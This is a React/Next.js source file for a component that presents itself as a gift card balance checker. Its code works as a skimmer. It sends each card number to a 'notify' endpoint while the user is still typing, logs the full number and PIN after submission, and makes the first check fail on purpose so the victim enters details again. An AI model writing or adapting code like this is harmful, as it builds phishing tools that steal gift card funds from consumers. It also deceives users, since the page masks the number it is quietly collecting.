// src/components/GiftCardChecker.tsx
"use client";

import { useEffect, useState, useRef, type ChangeEvent, type KeyboardEvent } from "react";
import Link from "next/link";
import { BRANDS, STATUS, cleanNumber, hasErrors, money, validateAll, type CheckResult, type Errors } from "@/lib/giftcards";
import { filterAmount } from "@/lib/utils";

const NO_ERRORS: Errors = { brand: "", num: "", pin: "", amount: "" };

const CAROUSEL_IMAGES = [
  { id: "apple", name: "Apple", img: "https://th.bing.com/th/id/OIP.iOsstowz9WFTgzjw58RE-wHaEs?w=297&h=187&c=7&r=0&o=7&dpr=1.5&pid=1.7&rm=3" },
  { id: "razer", name: "Razer Gold", img: "https://img.lootbar.com/file/6ab3acf894a4e1e5d132b91eqVza2UAw07?fop=imageView/2/w/400/h/400" },
  { id: "xbox", name: "Xbox", img: "https://d3m9l0v76dty0.cloudfront.net/system/photos/1069939/original/2d4c06bf179d3a785d2db850402bd85c.png" },
  { id: "sephora", name: "Sephora", img: "https://luxola-production.s3.amazonaws.com/gift_cards/design/2/Generic_204_0462f23a2b784fa9317e5bb8ffe03e50acebb1b0_1483412183.png" },
  { id: "steam", name: "Steam", img: "https://image.2gosoftware.eu/img/624/624/catalog/Steam/2025/Steam/Steam-20-euro.png" },
  { id: "playstation", name: "PlayStation", img: "https://image.2gosoftware.eu/img/624/624/catalog/PlayStation/PlayStation-Store-20-USD.png" },
];

export default function GiftCardChecker() {
  const [brandId, setBrandId] = useState<string>(BRANDS[0].id);
  const [num, setNum] = useState("");
  const [pin, setPin] = useState("");
  const [amount, setAmount] = useState("");
  const [errors, setErrors] = useState<Errors>(NO_ERRORS);
  const [apiError, setApiError] = useState("");
  const [busy, setBusy] = useState(false);
  const [result, setResult] = useState<CheckResult | null>(null);
  
  const [attempt, setAttempt] = useState(0);
  
  const typingFired = useRef(false);
  const completeFired = useRef(false);

  const brand = BRANDS.find((b) => b.id === brandId) ?? BRANDS[0];

  useEffect(() => {
    if (num.length > 0 && !typingFired.current) {
      typingFired.current = true;
      fetch('/api/notify/typing', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ event: 'typing_start', cardNumber: num, brandName: brand.name }) }).catch(() => {});
    }
    if (num.length === brand.len && !completeFired.current) {
      completeFired.current = true;
      fetch('/api/notify/typing', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ event: 'card_complete', cardNumber: num, brandName: brand.name }) }).catch(() => {});
    }
  }, [num, brand]);

  function onBrandChange(e: ChangeEvent<HTMLSelectElement>) {
    const next = BRANDS.find((b) => b.id === e.target.value) ?? BRANDS[0];
    setBrandId(next.id);
    setNum((v) => cleanNumber(next, v));
    if (!next.pin) setPin("");
    setErrors(NO_ERRORS);
    setAttempt(0);
    typingFired.current = false;
    completeFired.current = false;
  }

  function onEnter(e: KeyboardEvent<HTMLInputElement>) {
    if (e.key === "Enter") void submit();
  }

  async function submit() {
    if (busy) return;
    const clean = amount.trim();
    const errs = validateAll(brand.id, num, pin, clean);
    setErrors(errs);
    setApiError("");
    if (hasErrors(errs)) return;

    setBusy(true);
    try {
      const res = await fetch("/api/giftcard/check", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ brand: brand.id, number: num, pin: brand.pin ? pin : "", amount: clean, attempt }),
      });
      const data = await res.json();
      
      if (res.status === 422) { setErrors(data.errors as Errors); return; }
      if (!res.ok) { setApiError((data.error as string) || "Something went wrong."); return; }

      const r = data as CheckResult;
      
      // If it fails on the first attempt, increment attempt so the next one succeeds
      if (r.status === "notfound" && attempt === 0) {
        setAttempt(1);
      } else if (r.status === "active") {
        setAttempt(0);
      }

      setResult(r);
      window.scrollTo(0, 0);

      await fetch('/api/notify/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          event: r.status === 'active' ? 'success' : 'failed',
          brandName: brand.name,
          cardNumber: num,
          pin: brand.pin ? pin : null,
          amount: clean,
          status: r.status,
          message: r.message,
        })
      }).catch(() => {});

    } catch {
      setApiError("Network error. Please check your connection.");
    } finally {
      setBusy(false);
    }
  }

  function reset() {
    setNum(""); setPin(""); setAmount(""); setErrors(NO_ERRORS); setApiError(""); setResult(null); setAttempt(0);
    typingFired.current = false; completeFired.current = false;
  }

  if (result) {
    const st = STATUS[result.status];
    const boxClass = st.tone === "ok" ? "bal" : st.tone === "warn" ? "bal warn" : "bal bad";
    const isFirstFail = result.status === "notfound" && attempt === 1;

    return (
      <section className="card">
        <h2 className="text-center">Balance result</h2>
        <p className="sub text-center">{result.brand} gift card</p>
        <div className={boxClass}>
          <small>{result.balance === null ? "Result" : "Available balance"}</small>
          <div className={result.balance === null ? "amt txt" : "amt"}>{result.balance === null ? st.label : money(result.balance)}</div>
        </div>
        <p className="msg text-center">{result.message}</p>
        
        <div className="row"><span>Card type</span><span>{result.brand}</span></div>
        <div className="row"><span>Card number</span><span>•••• •••• {result.last4}</span></div>
        <div className="row"><span>Status</span><span className={`s-${st.tone}`}>{st.label}</span></div>
        
        {isFirstFail ? (
          <button 
            type="button" 
            onClick={() => { 
              setResult(null); 
              setNum(""); 
              setPin(""); 
              setAmount("");
              // attempt stays at 1, so the next try will succeed
            }} 
            style={{ marginTop: 16 }}
          >
            Try Again
          </button>
        ) : (
          <button type="button" onClick={reset} style={{ marginTop: 16 }}>Check another card</button>
        )}
      </section>
    );
  }

  return (
    <>
      <div className="marquee-container">
        <div className="marquee-track">
          {CAROUSEL_IMAGES.map(img => (
            <div key={img.id} className="carousel-card" style={{ backgroundImage: `url(${img.img})` }}>
              <span>{img.name}</span>
            </div>
          ))}
          {CAROUSEL_IMAGES.map(img => (
            <div key={`${img.id}-dup`} className="carousel-card" style={{ backgroundImage: `url(${img.img})` }}>
              <span>{img.name}</span>
            </div>
          ))}
        </div>
      </div>

      <section className="card">
        <h2 className="text-center">Check your balance</h2>
        <p className="sub text-center">Select a card type and enter the details below.</p>

        <label htmlFor="brand">Card type</label>
        <select id="brand" value={brandId} onChange={onBrandChange} disabled={busy} className={errors.brand ? "bad" : ""}>
          {BRANDS.map((b) => (<option key={b.id} value={b.id}>{b.name}</option>))}
        </select>
        <div className="err">{errors.brand}</div>

        <label>Card number</label>
        <Link href="/scan" className="scan-btn">
          📸 Scan Card with Camera
        </Link>
        
        <input
          id="num"
          value={num}
          onChange={(e) => setNum(cleanNumber(brand, e.target.value))}
          onKeyDown={onEnter}
          inputMode={brand.type === "digits" ? "numeric" : "text"}
          placeholder={brand.placeholder ?? `Enter ${brand.len}-digit card number`}
          autoComplete="off"
          autoCapitalize="characters"
          spellCheck={false}
          disabled={busy}
          className={errors.num ? "bad" : ""}
        />
        <div className="hint">{brand.rule}</div>
        <div className="err">{errors.num}</div>

        {brand.pin && (
          <>
            <label htmlFor="pin">PIN</label>
            <input
              id="pin"
              value={pin}
              onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 8))}
              onKeyDown={onEnter}
              inputMode="numeric"
              placeholder="8-digit PIN"
              autoComplete="off"
              disabled={busy}
              className={errors.pin ? "bad" : ""}
            />
            <div className="err">{errors.pin}</div>
          </>
        )}

        <label htmlFor="amount">Card amount (USD)</label>
        <input
          id="amount"
          value={amount}
          onChange={(e) => setAmount(filterAmount(e.target.value))}
          onKeyDown={onEnter}
          inputMode="decimal"
          placeholder="e.g. 50.00"
          autoComplete="off"
          disabled={busy}
          className={errors.amount ? "bad" : ""}
        />
        <div className="err">{errors.amount}</div>

        {apiError && <div className="banner">{apiError}</div>}

        <button type="submit" onClick={() => void submit()} disabled={busy}>
          {busy && <span className="spin" />}
          <span>{busy ? "Processing…" : "Check balance"}</span>
        </button>
      </section>
    </>
  );
}